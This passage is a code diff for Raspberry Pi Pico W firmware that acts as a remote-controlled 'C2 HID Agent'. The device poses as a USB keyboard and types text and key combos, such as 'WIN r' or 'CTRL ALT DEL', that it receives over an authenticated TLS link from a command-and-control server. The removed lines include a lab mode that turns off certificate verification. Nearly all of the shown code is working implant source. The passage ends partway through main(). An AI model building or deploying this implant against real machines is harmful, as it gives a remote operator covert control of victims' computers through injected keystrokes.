@@ -1,121 +1,39 @@
-/**
- * main.c — Pico W C2 HID Agent
- * Educational / lab use only.
- *
- * Architecture:
- *   Core 0 → Wi-Fi + mbedTLS TCP client + C2 protocol loop
- *   Core 1 → TinyUSB device stack (HID keyboard)
- *
- * The two cores communicate through a lock-free single-producer /
- * single-consumer ring buffer (hid_ring).  Core 0 enqueues keystroke
- * records; Core 1 dequeues them and feeds TinyUSB.
- *
- * Security properties preserved from the desktop agent:
- *   [SEC-1] No env-dump command — RUNNER_TOKEN / RUNNER_HMAC_SECRET
- *           never leave the device.
- *   [SEC-3] Constant-time token comparison via mbedtls_ct_memcmp().
- *   [SEC-4] TLS 1.3 with CA cert baked into flash (see ca_cert.h).
- *           Lab bypass: define AGENT_LAB_MODE=1 in CMake to skip
- *           verification (never in production).
- *   [OPS-1] Rate limiting — 30 keystroke-payloads / minute.
- *   [OPS-4] Watchdog + graceful shutdown on "terminate" action.
- *
- * Limitations vs desktop version (hardware constraints):
- *   - No fork/exec — keystroke injection IS the only "exec".
- *   - No path sanitisation needed (no filesystem access exposed).
- *   - 264 KB RAM (RP2040) / 520 KB (RP2350): mbedTLS heap must be
- *     kept lean; see MBEDTLS_CONFIG_FILE = "mbedtls_config.h".
- *
- * Dependencies (all pulled by pico-sdk / CMake):
- *   pico-sdk >= 1.5.1
- *   pico_cyw43_arch_lwip_threadsafe_background
- *   tinyusb_device (bundled in pico-sdk)
- *   mbedtls (bundled in pico-sdk)
- *
- * Build:
- *   mkdir build && cd build
- *   cmake -DPICO_BOARD=pico_w ..        # or pico2_w for RP2350
- *   make -j4
- */
-
+/* HIDra laboratory firmware: Core 0 network, Core 1 TinyUSB, bounded SPSC queue. */
 #include <stdio.h>
 #include <string.h>
+#include <stdlib.h>
 #include <stdint.h>
 #include <stdbool.h>
-
-/* ── Pico SDK ─────────────────────────────────────────────────────── */
 #include "pico/stdlib.h"
 #include "pico/multicore.h"
-#include "pico/mutex.h"
-#include "pico/time.h"
-#include "hardware/watchdog.h"
-
-/* ── Wi-Fi (CYW43) ───────────────────────────────────────────────── */
+#include "pico/critical_section.h"
+#include "pico/rand.h"
 #include "pico/cyw43_arch.h"
-#include "lwip/tcp.h"
-#include "lwip/dns.h"
-
-/* ── TinyUSB ─────────────────────────────────────────────────────── */
+#include "hardware/watchdog.h"
 #include "tusb.h"
-#include "usb_descriptors.h"   /* generated — see usb_descriptors.c  */
+#include "usb_descriptors.h"
+#include "agent_config.h"
+#include "protocol.h"
+#include "hid_queue.h"
+#include "tls_transport.h"
+#include "mbedtls/md.h"
+#include "mbedtls/sha256.h"
 
-/* ── mbedTLS ─────────────────────────────────────────────────────── */
-#include "mbedtls/ssl.h"
-#include "mbedtls/net_sockets.h"
-#include "mbedtls/entropy.h"
-#include "mbedtls/ctr_drbg.h"
-#include "mbedtls/error.h"
-#include "mbedtls/x509_crt.h"
-#include "mbedtls/constant_time.h"  /* mbedtls_ct_memcmp */
-
-/* ── JSON (tiny embedded parser — no heap alloc) ─────────────────── */
-#include "jsmn.h"   /* single-header: https://github.com/zserge/jsmn */
-
-/* ── Project headers ─────────────────────────────────────────────── */
-#include "agent_config.h"   /* WIFI_SSID, WIFI_PASS, C2_HOST, C2_PORT,
-                               RUNNER_TOKEN, RUNNER_HMAC_SECRET        */
-#include "ca_cert.h"        /* const char ca_cert_pem[]               */
-
-/* ═══════════════════════════════════════════════════════════════════
- * §1  HID keystroke ring buffer  (Core 0 writes, Core 1 reads)
- * ═══════════════════════════════════════════════════════════════════ */
-
-#define RING_CAP 64   /* max queued keystroke records                  */
-
-typedef struct {
-    uint8_t modifier;   /* HID modifier byte (SHIFT, CTRL, ALT …)     */
-    uint8_t keycode;    /* HID usage ID                                */
-    uint16_t delay_ms;  /* pause AFTER this key is released            */
-} hid_key_t;
-
-static hid_key_t  hid_ring[RING_CAP];
-static volatile uint32_t ring_head = 0;   /* written by Core 0        */
-static volatile uint32_t ring_tail = 0;   /* read    by Core 1        */
-
-/* Returns false if ring is full */
-static bool ring_push(hid_key_t k) {
-    uint32_t next = (ring_head + 1) % RING_CAP;
-    if (next == ring_tail) return false;   /* full                     */
-    hid_ring[ring_head] = k;
-    __dmb();                               /* memory barrier           */
-    ring_head = next;
-    return true;
+static hid_queue_t queue;
+static critical_section_t ring_lock;
+static void enter_queue(void *lock) { critical_section_enter_blocking(lock); }
+static void leave_queue(void *lock) { critical_section_exit(lock); }
+static void cancel_pending(void) { hid_queue_cancel(&queue); }
+static bool enqueue_special(uint8_t modifier, uint8_t keycode, uint16_t delay_ms) {
+    absolute_time_t deadline = make_timeout_time_ms(2000);
+    do {
+        if (hid_queue_push(&queue, (hid_key_t){modifier, keycode, delay_ms})) return true;
+        bool mounted = hid_queue_enabled(&queue);
+        if (!mounted) return false;
+        hidra_network_poll();
+    } while (!time_reached(deadline));
+    return false;
 }
-
-/* Returns false if ring is empty */
-static bool ring_pop(hid_key_t *out) {
-    if (ring_tail == ring_head) return false;
-    *out = hid_ring[ring_tail];
-    __dmb();
-    ring_tail = (ring_tail + 1) % RING_CAP;
-    return true;
-}
-
-/* ═══════════════════════════════════════════════════════════════════
- * §2  HID keycode helpers
- * ═══════════════════════════════════════════════════════════════════ */
-
-/* US-QWERTY layout lookup — returns {modifier, keycode} for printable ASCII */
 static hid_key_t ascii_to_hid(char c) {
     /* Letters */
     if (c >= 'a' && c <= 'z') return (hid_key_t){0,    (uint8_t)(HID_KEY_A + c - 'a'), 0};
@@ -167,371 +85,71 @@ static hid_key_t ascii_to_hid(char c) {
     }
 }
 
-/* Enqueue an entire string as individual keystrokes */
-static void enqueue_string(const char *s, uint16_t inter_key_ms) {
-    for (; *s; ++s) {
-        hid_key_t k = ascii_to_hid(*s);
-        if (k.keycode == 0 && *s != ' ') continue;
-        k.delay_ms = inter_key_ms;
-        /* Spin-wait if ring is full (Core 1 will drain it) */
-        while (!ring_push(k)) tight_loop_contents();
+
+static bool enqueue_string(const char *text) {
+    for (; *text; ++text) {
+        hid_key_t key = ascii_to_hid(*text);
+        if (!key.keycode || !enqueue_special(key.modifier, key.keycode, 20)) return false;
+    }
+    return true;
+}
+
+static void service_hid(hid_queue_t *q, void *unused) {
+    (void)unused;
+    static bool release;
+    static uint64_t ready_at;
+    static uint16_t after_release;
+    static uint32_t seen_generation;
+    bool mounted = tud_mounted() && !tud_suspended();
+    if (!mounted && q->enabled) { q->tail = q->head; ++q->generation; }
+    q->enabled = mounted;
+    if (seen_generation != q->generation) {
+        seen_generation = q->generation;
+        release = true; ready_at = 0; after_release = 0;
+    }
+    uint64_t now = time_us_64();
+    if (!mounted || !tud_hid_ready() || now < ready_at) return;
+    if (release) {
+        if (tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL)) {
+            release = false;
+            ready_at = now + (uint64_t)after_release * 1000;
+        }
+    } else if (q->tail != q->head) {
+        hid_key_t key = q->records[q->tail];
+        if (!key.keycode && !key.modifier) {
+            q->tail = (q->tail + 1) % RING_CAP;
+            ready_at = now + (uint64_t)key.delay_ms * 1000;
+        } else {
+            uint8_t keys[6] = {key.keycode, 0, 0, 0, 0, 0};
+            if (tud_hid_keyboard_report(REPORT_ID_KEYBOARD, key.modifier, keys)) {
+                q->tail = (q->tail + 1) % RING_CAP;
+                release = true; after_release = key.delay_ms;
+                ready_at = now + 8000;
+            }
+        }
     }
 }
-
-/* Enqueue a special key with optional modifier (e.g. WIN, GUI) */
-static void enqueue_special(uint8_t modifier, uint8_t keycode, uint16_t delay_ms) {
-    hid_key_t k = {modifier, keycode, delay_ms};
-    while (!ring_push(k)) tight_loop_contents();
-}
-
-/* ═══════════════════════════════════════════════════════════════════
- * §3  Core 1 — TinyUSB HID task
- * ═══════════════════════════════════════════════════════════════════ */
-
 static void core1_entry(void) {
     tusb_init();
-
-    hid_key_t pending  = {0, 0, 0};
-    bool       pressing = false;  /* true while key is held down      */
-    uint32_t   release_at = 0;   /* time_us_32() to release           */
-
     for (;;) {
-        tud_task();   /* TinyUSB main task — must be called frequently */
-
-        if (!tud_hid_ready()) continue;
-
-        if (pressing) {
-            /* Key is being held — release it after 8 ms */
-            if (time_us_32() >= release_at) {
-                tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL);
-                pressing = false;
-                if (pending.delay_ms)
-                    sleep_ms(pending.delay_ms);
-            }
-            continue;
-        }
-
-        hid_key_t k;
-        if (!ring_pop(&k)) continue;   /* nothing to inject           */
-
-        pending = k;
-        uint8_t keycodes[6] = {k.keycode, 0, 0, 0, 0, 0};
-        tud_hid_keyboard_report(REPORT_ID_KEYBOARD, k.modifier, keycodes);
-        pressing   = true;
-        release_at = time_us_32() + 8000;   /* 8 ms press duration    */
+        tud_task();
+        hid_queue_visit(&queue, service_hid, NULL);
+        tight_loop_contents();
     }
 }
-
-/* TinyUSB callbacks (must exist even if empty) */
-void tud_hid_report_complete_cb(uint8_t instance, uint8_t const *report, uint16_t len) {
-    (void)instance; (void)report; (void)len;
+void tud_hid_report_complete_cb(uint8_t instance, const uint8_t *report, uint16_t length) {
+    (void)instance; (void)report; (void)length;
 }
 uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id,
-                                hid_report_type_t type, uint8_t *buf, uint16_t len) {
-    (void)instance; (void)report_id; (void)type; (void)buf;
-    return len;
+    hid_report_type_t type, uint8_t *buffer, uint16_t length) {
+    (void)instance; (void)report_id; (void)type; (void)buffer; (void)length;
+    return 0; /* Unsupported request; never return uninitialized memory. */
 }
 void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id,
-                            hid_report_type_t type, uint8_t const *buf, uint16_t len) {
-    (void)instance; (void)report_id; (void)type; (void)buf; (void)len;
+    hid_report_type_t type, const uint8_t *buffer, uint16_t length) {
+    (void)instance; (void)report_id; (void)type; (void)buffer; (void)length;
 }
 
-/* ═══════════════════════════════════════════════════════════════════
- * §4  Rate limiter  (OPS-1 — 30 payloads / minute)
- * ═══════════════════════════════════════════════════════════════════ */
-
-#define RATE_LIMIT   30
-#define RATE_WINDOW  60000  /* ms */
-
-static uint32_t rate_ts[RATE_LIMIT];
-static int      rate_count = 0;
-
-static bool rate_allow(void) {
-    uint32_t now    = to_ms_since_boot(get_absolute_time());
-    uint32_t cutoff = now - RATE_WINDOW;
-
-    /* Evict old timestamps */
-    int i, j = 0;
-    for (i = 0; i < rate_count; i++)
-        if (rate_ts[i] >= cutoff) rate_ts[j++] = rate_ts[i];
-    rate_count = j;
-
-    if (rate_count >= RATE_LIMIT) return false;
-    rate_ts[rate_count++] = now;
-    return true;
-}
-
-/* ═══════════════════════════════════════════════════════════════════
- * §5  Crypto — HMAC-SHA256 via mbedTLS + constant-time compare
- * ═══════════════════════════════════════════════════════════════════ */
-
-#include "mbedtls/md.h"
-
-static void hmac_sha256_hex(const char *secret, size_t slen,
-                             const char *msg,    size_t mlen,
-                             char        out[65]) {
-    uint8_t digest[32];
-    mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
-                    (const uint8_t *)secret, slen,
-                    (const uint8_t *)msg,    mlen,
-                    digest);
-    for (int i = 0; i < 32; i++)
-        snprintf(out + i * 2, 3, "%02x", digest[i]);
-    out[64] = '\0';
-}
-
-/* [SEC-3] Constant-time compare via mbedTLS */
-static bool ct_equal(const char *a, const char *b, size_t len) {
-    return mbedtls_ct_memcmp(a, b, len) == 0;
-}
-
-/* ═══════════════════════════════════════════════════════════════════
- * §6  Minimal JSON helpers (jsmn-based, no heap)
- * ═══════════════════════════════════════════════════════════════════ */
-
-#define MAX_TOKENS 64
-
-static bool json_eq(const char *js, jsmntok_t *t, const char *s) {
-    size_t len = strlen(s);
-    return (size_t)(t->end - t->start) == len &&
-           memcmp(js + t->start, s, len) == 0;
-}
-
-/* Extract string value for a given key into buf (NUL-terminated).
- * Returns false if key not found or value too long for buf. */
-static bool json_get_str(const char *js, jsmntok_t *toks, int cnt,
-                          const char *key, char *buf, size_t bufsz) {
-    for (int i = 1; i < cnt - 1; i++) {
-        if (toks[i].type == JSMN_STRING && json_eq(js, &toks[i], key) &&
-            toks[i + 1].type == JSMN_STRING) {
-            size_t vlen = (size_t)(toks[i + 1].end - toks[i + 1].start);
-            if (vlen >= bufsz) return false;
-            memcpy(buf, js + toks[i + 1].start, vlen);
-            buf[vlen] = '\0';
-            return true;
-        }
-    }
-    return false;
-}
-
-/* ═══════════════════════════════════════════════════════════════════
- * §7  TLS connection (mbedTLS over lwIP raw TCP via net_sockets)
- * ═══════════════════════════════════════════════════════════════════ */
-
-typedef struct {
-    mbedtls_ssl_context      ssl;
-    mbedtls_ssl_config       conf;
-    mbedtls_net_context      net;
-    mbedtls_x509_crt         cacert;
-    mbedtls_entropy_context  entropy;
-    mbedtls_ctr_drbg_context drbg;
-    bool                     connected;
-} tls_ctx_t;
-
-static void tls_ctx_init(tls_ctx_t *ctx) {
-    mbedtls_ssl_init(&ctx->ssl);
-    mbedtls_ssl_config_init(&ctx->conf);
-    mbedtls_net_init(&ctx->net);
-    mbedtls_x509_crt_init(&ctx->cacert);
-    mbedtls_entropy_init(&ctx->entropy);
-    mbedtls_ctr_drbg_init(&ctx->drbg);
-    ctx->connected = false;
-}
-
-static void tls_ctx_free(tls_ctx_t *ctx) {
-    mbedtls_ssl_close_notify(&ctx->ssl);
-    mbedtls_net_free(&ctx->net);
-    mbedtls_ssl_free(&ctx->ssl);
-    mbedtls_ssl_config_free(&ctx->conf);
-    mbedtls_x509_crt_free(&ctx->cacert);
-    mbedtls_ctr_drbg_free(&ctx->drbg);
-    mbedtls_entropy_free(&ctx->entropy);
-    ctx->connected = false;
-}
-
-static bool tls_connect(tls_ctx_t *ctx, const char *host, const char *port) {
-    int ret;
-
-    ret = mbedtls_ctr_drbg_seed(&ctx->drbg, mbedtls_entropy_func,
-                                  &ctx->entropy, NULL, 0);
-    if (ret) { printf("[TLS] drbg seed: -0x%04x\n", (unsigned)-ret); return false; }
-
-#ifdef AGENT_LAB_MODE
-    printf("[WARN] TLS cert verification OFF — lab mode\n");
-    mbedtls_ssl_config_defaults(&ctx->conf, MBEDTLS_SSL_IS_CLIENT,
-                                  MBEDTLS_SSL_TRANSPORT_STREAM,
-                                  MBEDTLS_SSL_PRESET_DEFAULT);
-    mbedtls_ssl_conf_authmode(&ctx->conf, MBEDTLS_SSL_VERIFY_NONE);
-#else
-    /* [SEC-4] Load CA cert baked into flash */
-    ret = mbedtls_x509_crt_parse(&ctx->cacert,
-                                   (const uint8_t *)ca_cert_pem,
-                                   strlen(ca_cert_pem) + 1);
-    if (ret) { printf("[TLS] ca parse: -0x%04x\n", (unsigned)-ret); return false; }
-
-    mbedtls_ssl_config_defaults(&ctx->conf, MBEDTLS_SSL_IS_CLIENT,
-                                  MBEDTLS_SSL_TRANSPORT_STREAM,
-                                  MBEDTLS_SSL_PRESET_DEFAULT);
-    mbedtls_ssl_conf_authmode(&ctx->conf, MBEDTLS_SSL_VERIFY_REQUIRED);
-    mbedtls_ssl_conf_ca_chain(&ctx->conf, &ctx->cacert, NULL);
-#endif
-
-    /* [SEC-4] Minimum TLS 1.3 */
-    mbedtls_ssl_conf_min_tls_version(&ctx->conf, MBEDTLS_SSL_VERSION_TLS1_3);
-    mbedtls_ssl_conf_rng(&ctx->conf, mbedtls_ctr_drbg_random, &ctx->drbg);
-
-    ret = mbedtls_ssl_setup(&ctx->ssl, &ctx->conf);
-    if (ret) { printf("[TLS] setup: -0x%04x\n", (unsigned)-ret); return false; }
-
-    ret = mbedtls_ssl_set_hostname(&ctx->ssl, host);
-    if (ret) { printf("[TLS] set_hostname: -0x%04x\n", (unsigned)-ret); return false; }
-
-    ret = mbedtls_net_connect(&ctx->net, host, port, MBEDTLS_NET_PROTO_TCP);
-    if (ret) { printf("[TLS] connect: -0x%04x\n", (unsigned)-ret); return false; }
-
-    mbedtls_ssl_set_bio(&ctx->ssl, &ctx->net,
-                         mbedtls_net_send, mbedtls_net_recv, NULL);
-
-    while ((ret = mbedtls_ssl_handshake(&ctx->ssl)) != 0) {
-        if (ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE) {
-            printf("[TLS] handshake: -0x%04x\n", (unsigned)-ret);
-            return false;
-        }
-    }
-    ctx->connected = true;
-    printf("[TLS] connected to %s:%s\n", host, port);
-    return true;
-}
-
-/* Send a NUL-terminated string + newline */
-static bool tls_send_line(tls_ctx_t *ctx, const char *line) {
-    size_t len = strlen(line);
-    size_t sent = 0;
-    while (sent < len) {
-        int n = mbedtls_ssl_write(&ctx->ssl,
-                                   (const uint8_t *)line + sent,
-                                   len - sent);
-        if (n <= 0) return false;
-        sent += (size_t)n;
-    }
-    /* send the newline */
-    unsigned char nl = '\n';
-    return mbedtls_ssl_write(&ctx->ssl, &nl, 1) == 1;
-}
-
-#define RECV_BUF_SZ 2048
-
-/* Read one newline-terminated line into buf.
- * Returns false on error or buffer overflow. */
-static bool tls_recv_line(tls_ctx_t *ctx, char *buf, size_t bufsz) {
-    size_t pos = 0;
-    while (pos < bufsz - 1) {
-        unsigned char c;
-        int n = mbedtls_ssl_read(&ctx->ssl, &c, 1);
-        if (n == MBEDTLS_ERR_SSL_WANT_READ) continue;
-        if (n <= 0) return false;
-        if (c == '\r') continue;
-        if (c == '\n') { buf[pos] = '\0'; return true; }
-        buf[pos++] = (char)c;
-    }
-    return false;   /* overflow */
-}
-
-/* ═══════════════════════════════════════════════════════════════════
- * §8  Protocol — JSON envelope with HMAC-SHA256
- * ═══════════════════════════════════════════════════════════════════ */
-
-/* Static send buffer (no heap) */
-static char s_send_buf[1024];
-static char s_recv_buf[RECV_BUF_SZ];
-
-/* Build {"body":"<body>","sig":"<hmac>"}\n and send */
-static bool proto_send(tls_ctx_t *ctx, const char *body) {
-    char sig[65] = "";
-    if (RUNNER_HMAC_SECRET[0]) {
-        hmac_sha256_hex(RUNNER_HMAC_SECRET, strlen(RUNNER_HMAC_SECRET),
-                        body, strlen(body), sig);
-    }
-    /* Minimal JSON serialisation — body must not contain '"' unescaped */
-    snprintf(s_send_buf, sizeof(s_send_buf),
-             "{\"body\":\"%s\",\"sig\":\"%s\"}", body, sig);
-    return tls_send_line(ctx, s_send_buf);
-}
-
-typedef struct {
-    char action[32];
-    char payload[512];   /* raw "text" / "keys" field value            */
-    char token[128];
-    char error[128];
-} parsed_msg_t;
-
-/* Receive one envelope, verify HMAC, extract fields.
- * Returns false on connection error.
- * Sets msg->action = "invalid" on HMAC failure. */
-static bool proto_recv(tls_ctx_t *ctx, parsed_msg_t *msg) {
-    memset(msg, 0, sizeof(*msg));
-
-    if (!tls_recv_line(ctx, s_recv_buf, sizeof(s_recv_buf))) return false;
-
-    /* Parse outer envelope: {"body":"...","sig":"..."} */
-    jsmn_parser p; jsmntok_t toks[MAX_TOKENS];
-    jsmn_init(&p);
-    int cnt = jsmn_parse(&p, s_recv_buf, strlen(s_recv_buf), toks, MAX_TOKENS);
-    if (cnt < 1 || toks[0].type != JSMN_OBJECT) {
-        strncpy(msg->action, "invalid", sizeof(msg->action));
-        return true;
-    }
-
-    char body[512], sig_recv[65];
-    if (!json_get_str(s_recv_buf, toks, cnt, "body", body, sizeof(body))) {
-        strncpy(msg->action, "invalid", sizeof(msg->action));
-        return true;
-    }
-    json_get_str(s_recv_buf, toks, cnt, "sig", sig_recv, sizeof(sig_recv));
-
-    /* [SEC-3] Verify HMAC before processing body */
-    if (RUNNER_HMAC_SECRET[0]) {
-        char sig_calc[65];
-        hmac_sha256_hex(RUNNER_HMAC_SECRET, strlen(RUNNER_HMAC_SECRET),
-                        body, strlen(body), sig_calc);
-        if (!ct_equal(sig_calc, sig_recv, 64)) {
-            strncpy(msg->action, "invalid", sizeof(msg->action));
-            return true;
-        }
-    }
-
-    /* Parse inner body JSON */
-    jsmn_init(&p);
-    cnt = jsmn_parse(&p, body, strlen(body), toks, MAX_TOKENS);
-    if (cnt < 1) { strncpy(msg->action, "invalid", sizeof(msg->action)); return true; }
-
-    json_get_str(body, toks, cnt, "action",  msg->action,  sizeof(msg->action));
-    json_get_str(body, toks, cnt, "text",    msg->payload, sizeof(msg->payload));
-    json_get_str(body, toks, cnt, "keys",    msg->payload, sizeof(msg->payload));
-    json_get_str(body, toks, cnt, "token",   msg->token,   sizeof(msg->token));
-
-    return true;
-}
-
-/* ═══════════════════════════════════════════════════════════════════
- * §9  Payload executor
- *
- * The server sends one of:
- *   {"action":"type",    "text":"Hello World\n"}
- *       → inject text string character by character
- *
- *   {"action":"key",     "keys":"WIN r"}
- *       → inject a special key combo  (modifier+key pairs)
- *         Supported modifiers: CTRL, SHIFT, ALT, WIN/GUI
- *         Supported keys: any single char, or named keys
- *         (ENTER, TAB, ESC, F1-F12, UP, DOWN, LEFT, RIGHT, DEL, HOME)
- *         Example: "CTRL ALT DEL", "WIN r", "SHIFT F10"
- *
- *   {"action":"delay",   "text":"500"}
- *       → sleep N milliseconds (max 5000)
- * ═══════════════════════════════════════════════════════════════════ */
-
-/* Named-key lookup (subset of HID usage table) */
 typedef struct { const char *name; uint8_t keycode; } named_key_t;
 static const named_key_t named_keys[] = {
     {"ENTER",  HID_KEY_ENTER},    {"ESC",    HID_KEY_ESCAPE},
@@ -549,7 +167,7 @@ static const named_key_t named_keys[] = {
 };
 
 /* Parse "WIN r" / "CTRL ALT DEL" / "F5" etc. and enqueue */
-static void enqueue_key_combo(const char *spec) {
+static bool enqueue_key_combo(const char *spec) {
     char buf[64]; strncpy(buf, spec, sizeof(buf)-1); buf[sizeof(buf)-1] = '\0';
 
     uint8_t modifier = 0;
@@ -583,164 +201,138 @@ static void enqueue_key_combo(const char *spec) {
         token = strtok(NULL, " ");
     }
 
-    if (keycode) enqueue_special(modifier, keycode, 80);
+    return keycode && enqueue_special(modifier, keycode, 80);
 }
 
-static void run_payload(const parsed_msg_t *msg) {
-    if (!strcmp(msg->action, "type")) {
-        enqueue_string(msg->payload, 20);   /* 20 ms between keys      */
 
-    } else if (!strcmp(msg->action, "key")) {
-        enqueue_key_combo(msg->payload);
-
-    } else if (!strcmp(msg->action, "delay")) {
-        uint32_t ms = (uint32_t)atoi(msg->payload);
-        if (ms > 5000) ms = 5000;           /* cap at 5 s              */
-        sleep_ms(ms);
-    }
+static bool run_payload(const char *action, const char *payload) {
+    if (!strcmp(action, "type")) return enqueue_string(payload);
+    if (!strcmp(action, "key")) return enqueue_key_combo(payload);
+    /* Already strictly parsed and range checked by hidra_command. */
+    return enqueue_special(0, 0, (uint16_t)strtoul(payload, NULL, 10));
 }
+static uint32_t rate_timestamps[30];
+static unsigned rate_count;
+static hidra_tls_t tls;
+static char line[HIDRA_MAX_FRAME + 1], body[HIDRA_MAX_BODY + 1], sid[65];
+static uint32_t txseq, rxseq;
 
-/* ═══════════════════════════════════════════════════════════════════
- * §10  Session handler (Core 0)
- * ═══════════════════════════════════════════════════════════════════ */
-
-static char port_str[8];
-
-static void run_session(void) {
-    tls_ctx_t ctx;
-    tls_ctx_init(&ctx);
-
-    snprintf(port_str, sizeof(port_str), "%d", C2_PORT);
-    if (!tls_connect(&ctx, C2_HOST, port_str)) {
-        tls_ctx_free(&ctx);
-        return;
-    }
-
-    bool auth = false;
-
-    /* Send initial auth */
-    char auth_body[256];
-    snprintf(auth_body, sizeof(auth_body),
-             "{\"action\":\"auth\",\"token\":\"%s\"}", RUNNER_TOKEN);
-    proto_send(&ctx, auth_body);
-
-    for (;;) {
-        parsed_msg_t msg;
-        if (!proto_recv(&ctx, &msg)) {
-            printf("[C2] disconnected\n");
-            break;
-        }
-
-        /* [SEC-3] Validate HMAC — disconnect on tampered message */
-        if (!strcmp(msg.action, "invalid")) {
-            printf("[C2] dropping: invalid envelope or HMAC\n");
-            break;
-        }
-
-        /* Pre-auth: only "ping" and server's auth-ack pass through */
-        if (!auth) {
-            if (!strcmp(msg.action, "ok") || !strcmp(msg.action, "pong")) {
-                auth = true;
-                printf("[C2] authenticated\n");
-                continue;
-            }
-            /* Anything else before auth-ack — disconnect */
-            printf("[C2] unexpected pre-auth action: %s\n", msg.action);
-            break;
-        }
-
-        if (!strcmp(msg.action, "ping")) {
-            proto_send(&ctx, "{\"action\":\"pong\",\"ok\":true}");
-            continue;
-        }
-
-        if (!strcmp(msg.action, "type") ||
-            !strcmp(msg.action, "key")  ||
-            !strcmp(msg.action, "delay")) {
-
-            /* [OPS-1] Rate limit */
-            if (!rate_allow()) {
-                proto_send(&ctx, "{\"ok\":false,\"error\":\"rate limit exceeded\"}");
-                continue;
-            }
-            run_payload(&msg);
-            proto_send(&ctx, "{\"ok\":true}");
-            continue;
-        }
-
-        if (!strcmp(msg.action, "exit")) {
-            proto_send(&ctx, "{\"ok\":true,\"message\":\"bye\"}");
-            break;
-        }
-
-        if (!strcmp(msg.action, "terminate")) {
-            proto_send(&ctx, "{\"ok\":true,\"message\":\"terminating\"}");
-            printf("[C2] terminate — rebooting\n");
-            tls_ctx_free(&ctx);
-            watchdog_reboot(0, 0, 0);
-            return;
-        }
-
-        /* Unknown action */
-        char err[128];
-        snprintf(err, sizeof(err), "{\"ok\":false,\"error\":\"unknown action: %s\"}",
-                 msg.action);
-        proto_send(&ctx, err);
-    }
-
-    tls_ctx_free(&ctx);
+static bool hmac_callback(void *unused, const char *data, size_t length, char output[65]) {
+    (void)unused;
+    unsigned char digest[32];
+    const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
+    if (!info || mbedtls_md_hmac(info, (const unsigned char *)RUNNER_HMAC_SECRET,
+        strlen(RUNNER_HMAC_SECRET), (const unsigned char *)data, length, digest) != 0) return false;
+    for (unsigned i = 0; i < 32; ++i) snprintf(output + i * 2, 3, "%02x", digest[i]);
+    output[64] = 0;
+    return true;
 }
-
-/* ═══════════════════════════════════════════════════════════════════
- * §11  Main — Core 0 (Wi-Fi + C2 loop)
- * ═══════════════════════════════════════════════════════════════════ */
-
+static bool send_body(const char *message) {
+    if (!hidra_encode(sid, txseq, "a2s", message, hmac_callback, NULL, line, sizeof(line)) ||
+        !hidra_tls_writeline(&tls, line)) return false;
+    ++txseq;
+    return true;
+}
+static bool receive_body(void) {
+    if (!hidra_tls_readline(&tls, line, sizeof(line)) ||
+        !hidra_decode(sid, rxseq, "s2a", line, hmac_callback, NULL, body, sizeof(body))) return false;
+    ++rxseq;
+    return true;
+}
+static bool negotiate(void) {
+    hidra_object_t object;
+    char challenge[65], nonce[65], material[139];
+    unsigned char random[32], digest[32];
+    if (!hidra_tls_readline(&tls, line, sizeof(line)) || !hidra_parse(line, &object) ||
+        object.count != 1 || !hidra_string(&object, "challenge", challenge, sizeof(challenge)) ||
+        !hidra_hex64(challenge) || mbedtls_ctr_drbg_random(&tls.drbg, random, sizeof(random)) != 0) return false;
+    for (unsigned i = 0; i < 32; ++i) snprintf(nonce + i * 2, 3, "%02x", random[i]);
+    int length = snprintf(material, sizeof(material), "HIDra/2\n%s\n%s", challenge, nonce);
+    if (length < 0 || (size_t)length >= sizeof(material) ||
+        mbedtls_sha256((const unsigned char *)material, (size_t)length, digest, 0) != 0) return false;
+    for (unsigned i = 0; i < 32; ++i) snprintf(sid + i * 2, 3, "%02x", digest[i]);
+    snprintf(line, sizeof(line), "{\"nonce\":\"%s\"}", nonce);
+    txseq = rxseq = 1;
+    return hidra_tls_writeline(&tls, line);
+}
+/* 0 = retry transport, 1 = clean exit or rejected authentication, 2 = reboot. */
+static int run_session(void) {
+    int outcome = 0;
+    hidra_tls_init(&tls);
+    if (!hidra_tls_connect(&tls, C2_ADDRESS, C2_HOST, C2_PORT) || !negotiate()) goto cleanup;
+    char quoted_token[768];
+    if (!hidra_quote(RUNNER_TOKEN, quoted_token, sizeof(quoted_token))) goto cleanup;
+    int length = snprintf(body, sizeof(body), "{\"action\":\"auth\",\"token\":%s}", quoted_token);
+    if (length < 0 || (size_t)length >= sizeof(body) || !send_body(body) || !receive_body()) goto cleanup;
+    hidra_object_t ack;
+    char action[16], payload[257];
+    if (!hidra_parse(body, &ack) || ack.count != 2 || !hidra_true(&ack, "ok") ||
+        !hidra_string(&ack, "action", action, sizeof(action)) || strcmp(action, "ok")) {
+        outcome = 1; goto cleanup;
+    }
+    printf("[C2] authenticated (protocol v2)\n");
+    while (receive_body()) {
+        if (!hidra_command(body, action, payload)) {
+            if (!send_body("{\"ok\":false,\"error\":\"invalid command\"}")) break;
+        } else if (!strcmp(action, "ping")) {
+            if (!send_body("{\"ok\":true,\"action\":\"pong\"}")) break;
+        } else if (!strcmp(action, "exit") || !strcmp(action, "terminate")) {
+            cancel_pending();
+            if (send_body("{\"ok\":true}")) outcome = !strcmp(action, "exit") ? 1 : 2;
+            break;
+        } else if (!hidra_rate_allow(to_ms_since_boot(get_absolute_time()), rate_timestamps, &rate_count)) {
+            if (!send_body("{\"ok\":false,\"error\":\"rate limit exceeded\"}")) break;
+        } else if (!run_payload(action, payload)) {
+            cancel_pending();
+            (void)send_body("{\"ok\":false,\"error\":\"HID unavailable or queue timeout\"}");
+            break; /* Partial emission cannot be rolled back; never retry automatically. */
+        } else if (!send_body("{\"ok\":true}")) break;
+    }
+cleanup:
+    cancel_pending();
+    hidra_tls_free(&tls);
+    return outcome;
+}
+static bool valid_secret(const char *value) {
+    size_t n = strlen(value);
+    if (n < 32 || n > 127 || !strncmp(value, "change_me", 9) || !strncmp(value, "your_", 5)) return false;
+    for (size_t i = 0; i < n; ++i) if (value[i] < 33 || value[i] > 126) return false;
+    return true;
+}
 int main(void) {
     stdio_init_all();
-    sleep_ms(2000);   /* wait for USB enumeration after flash          */
-
-    printf("[BOOT] Pico W C2 HID Agent\n");
-    printf("[BOOT] board: " PICO_BOARD "\n");
-
